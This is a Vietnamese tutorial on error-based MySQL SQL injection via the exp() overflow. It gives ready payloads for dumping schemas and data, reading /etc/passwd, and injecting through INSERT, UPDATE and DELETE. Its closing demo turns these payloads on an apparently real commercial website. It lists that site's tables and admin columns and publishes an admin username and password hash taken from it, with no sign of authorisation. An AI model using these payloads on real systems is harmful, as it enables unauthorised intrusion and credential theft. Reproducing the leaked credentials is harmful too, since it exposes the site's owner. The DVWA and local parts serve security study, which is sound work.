### Người thực hiện: Trần Ngọc Nam
### Thời gian: 22/04/2022, 25/04/2022

## Error Based SQL Injection Using EXP:

# Mục lục:
1. [Overview](#1)
2. [Injection](#2)
3. [Extracting Data](#3)
4. [Dump In One Shot](#4)
5. [Reading Files](#5)
6. [Injection in Insert](#6)
7. [Injection in Update](#7)
8. [Injection in Delete](#8)
9. [Conclusion](#9)
10. [Demo](#10)

### Overview:<a name="1"></a>
- Đây là một lỗi tràn khác trong kiểu dữ liệu DOUBLE trong MySQL đã tìm thấy.
- Hàm exp() sẽ gây ra lỗi tràn khi giá trị lớn hơn 709.
- Ví dụ:
    ```php
    mysql> select exp(709);
    +-----------------------+
    | exp(709)              |
    +-----------------------+
    | 8.218407461554972e307 |
    +-----------------------+
    1 row in set (0.00 sec)

    mysql> select exp(710);
    ERROR 1690 (22003): DOUBLE value is out of range in 'exp(710)'
    ```
- Hàm exp() trái ngược với hàm ln() và log() của MySQL.
- Ví dụ:
    ```php
    mysql> select log(15);
    +------------------+
    | log(15)          |
    +------------------+
    | 2.70805020110221 |
    +------------------+
    1 row in set (0.00 sec)


    mysql> select ln(15);
    +------------------+
    | ln(15)           |
    +------------------+
    | 2.70805020110221 |
    +------------------+
    1 row in set (0.00 sec)

    Thì hàm exp sẽ hoàn toàn ngược lại:
    
    mysql> select exp(2.70805020110221);
    +-----------------------+
    | exp(2.70805020110221) |
    +-----------------------+
    |                    15 |
    +-----------------------+
    1 row in set (0.00 sec)
    ```

### Injection:<a name="2"></a>
- Ta có thể gây ra các lỗi "giá trị DOUBLE nằm ngoài phạm vi" bằng cách phủ định các truy vấn.
- Vì vậy, khi ta chuyển các truy vấn phụ bằng cách phủ định bit, điều này sẽ gây ra lỗi tràn DOUBLE và ta có thể trích xuất dữ liệu <code>select exp(~(select*from(select user())x));</code>.
    ```php
    mysql> select exp(~(select*from(select user())x));
    ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'
    ```

### Extracting Data:<a name="3"></a>
- Từ ví dụ trên ta có thể dễ dàng trích xuất dữ liệu thông qua các truy vấn như:
  - Lấy tên bảng <code>select exp(~(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x));</code>
  - Nhận tên cột <code>select exp(~(select*from(select column_name from information_schema.columns where table_name=’users’ limit 0,1)x));</code>
  - Truy xuất dữ liệu <code>select exp(~ (select*from(select concat_ws(‘:’,id, username, password) from users limit 0,1)x));</code>

### Dump In One Shot:<a name="4"></a>
- Hoặc ta có thể đổ tất cả các bảng và cột ra ngoài thông qua 1 câu truy vấn <code>exp(~(select*from(select(concat(@:=0,(select count(*)from'information_schema'.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name))))x))</code>. Tuy nhiên, ta đang trích xuất thông qua lỗi nên kết quả trả về rất ít kết quả.
  ```php
  http://localhost/dvwa/vulnerabilities/sqli/?id=1' or exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x))-- -&Submit=Submit#
  ```
    ![alt](https://i.imgur.com/zWuUK0x.png)

### Reading Files:<a name="5"></a>
- Ta có thể đọc các tệp bằng cách áp dụng hàm load_file() nhưng nó có giới hạn 13 dòng <code>select exp(~(select*from(select load_file('/etc/passwd'))a));</code>.
- Điều này cũng có thể được áp dụng trong tiêm tràn BIGINT.
    ![alt](https://i.imgur.com/1PMGjUN.png)

- Tuy nhiên vẫn có một số bất tiện, ta không thể viết vào các tệp vì đây là lỗi nó sẽ chỉ viết 0.
  ```php
    mysql> select exp(~(select*from(select 'hello')a)) into outfile 'C:/out.txt';
    ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'hello' from dual)))'

    # type C:\out.txt
    0
  ```

### Injection in Insert:<a name="6"></a>
- Đối với lệnh chèn, ta vẫn thực hiện bình thường <code>insert into users (id, username, password) values (2, '' ^ exp(~(select*from(select user())x)), 'Eyre');</code>.
  ```php
  mysql> insert into users (id, username, password) values (2, '' ^ exp(~(select*from(select user())x)), 'Eyre');
  ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'
  ```
- Ngoài ra các truy vấn chèn, xóa và sửa còn có thể sử dụng bằng truy vấn DIOS <code>insert into users (id, username, password) values (2, '' | exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)), 'Eyre');</code>
  ```php
  mysql> insert into users (id, username, password) values (2, '' | exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)), 'Eyre');
  ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select '000 newdb::users::id
  newdb::users::username
  newdb::users::password' from dual)))'
  ```

### Injection in Update:<a name="7"></a>
- Tương tự cho lệnh cập nhật <code>update users set password='Peter' ^ exp(~(select*from(select user())x)) where id=4;</code>
  ```php
  mysql> update users set password='Peter' ^ exp(~(select*from(select user())x)) where id=4;
  ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'
  ```

### Injection in Delete:<a name="8"></a>
- Hoàn toàn tương tự cho lệnh xóa <code>delete from users where id='1' | exp(~(select*from(select user())x));</code>
  ```php
  mysql> delete from users where id='1' | exp(~(select*from(select user())x);
  ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'
  ```

### Conclusion:<a name="9"></a>
- Tiêm exp() có cấu trúc và cách thực hiện khá rõ ràng nhưng nhược điểm của nó là chỉ  hoạt động trong phiên bản MySQL 5.5.5 trở lên.

### Demo:<a name="10"></a>
- Đối tượng thử nghiệm vẫn sẽ là <code>http://aminter.co.th/index.php</code>.
- Để kiểm tra được version, ta dùng <code>or exp(~(select*from(select version() from information_schema.tables where table_schema=database() limit 0,1)x))</code>
  ```php
  http://aminter.co.th/product2.php?id=3%20or%20exp(~(select*from(select%20version()%20from%20information_schema.tables%20where%20table_schema=database()%20limit%201,1)x))
  ```
  ![CHEESE](../img/13.png)
- Như vậy, database đang sử dụng phiên bản <code>5.5.44-log</code>.
- Tiếp theo, ta có thể dùng <code>or exp(~(select*from(select database() from information_schema.tables where table_schema=database() limit 0,1)x))</code> để lấy được tên database.
  ```php
  http://aminter.co.th/product2.php?id=3%20or%20exp(~(select*from(select%20database()%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1)x))
  ```
  ![CHEESE](../img/14.png)
- Ta có thể thấy tên database là <code>aminter_aminter</code>
- Để lấy được tên các table, ta dùng <code>or exp(~(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x))</code>
  ```php
  http://aminter.co.th/product2.php?id=3%20or%20exp(~(select*from(select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1)x))
  ```
  ![CHEESE](../img/15.png)
- Sau khi check lần lượt, ta có được danh sách table:
  | No. | Table name        |
  | --- | ----------------- |
  | 1   | ck_agent          |
  | 2   | ck_banner         |
  | 3   | ck_brand          |
  | 4   | ck_catalogue      |
  | 5   | ck_contact        |
  | 6   | ck_figure         |
  | 7   | ck_group          |
  | 8   | ck_member         |
  | 9   | ck_menu           |
  | 10  | ck_menufront      |
  | 11  | ck_news           |
  | 12  | ck_picnews        |
  | 13  | ck_product        |
  | 14  | ck_productbrand   |
  | 15  | ck_productpicture |
  | 16  | ck_productsub     |
  | 17  | ck_producttype    |
  | 18  | ck_subfigure      |
  | 19  | ck_subgroup       |
  | 20  | ck_user_admin     |
  | 21  | ck_welcome        |
- Ta có thể thấy thông tin các cột thông qua <code>or exp(~(select*from(select column_name from information_schema.columns where table_name='ck_user_admin' limit 0,1)x))</code>
  ```php
  http://aminter.co.th/product2.php?id=3%20or%20exp(~(select*from(select%20column_name%20from%20information_schema.columns%20where%20table_name=%27ck_user_admin%27%20limit%200,1)x))
  ```
  ![CHEESE](../img/16.png)
- Tương tự như kiểm tra cột, ta có:
  | No. | Column name        |
  | --- | ------------------ |
  | 1   | admin_id           |
  | 2   | admin_username     |
  | 3   | admin_pass         |
  | 4   | admin_name         |
  | 5   | admin_surname      |
  | 6   | admin_email        |
  | 7   | admin_tel          |
  | 8   | admin_active       |
  | 9   | admin_ip_login     |
  | 10  | admin_admin_create |
  | 11  | admin_admin_update |
  | 12  | admin_date_create  |
  | 13  | admin_date_update  |
  | 14  | admin_date_login   |
- Sau khi có thông tin các cột, ta dùng <code>or exp(~ (select*from(select concat(admin_username) from ck_user_admin limit 0,1)x))</code>
  ```php
  http://aminter.co.th/product2.php?id=3%20or%20exp(~%20(select*from(select%20concat(admin_username)%20from%20ck_user_admin%20limit%200,1)x))
  ```
  ![CHEESE](../img/17.png)
- Và dùng <code>or exp(~ (select*from(select concat(admin_pass) from ck_user_admin limit 0,1)x))</code>
  ```php
  http://aminter.co.th/product2.php?id=3%20or%20exp(~%20(select*from(select%20concat(admin_pass)%20from%20ck_user_admin%20limit%200,1)x))
  ```
  ![CHEESE](../img/18.png)
- - Như vậy, ta đã có thông tin username: <code>hiddenwiki</code> và password: <code>cccc56525135d9fe92937ba95ea051</code>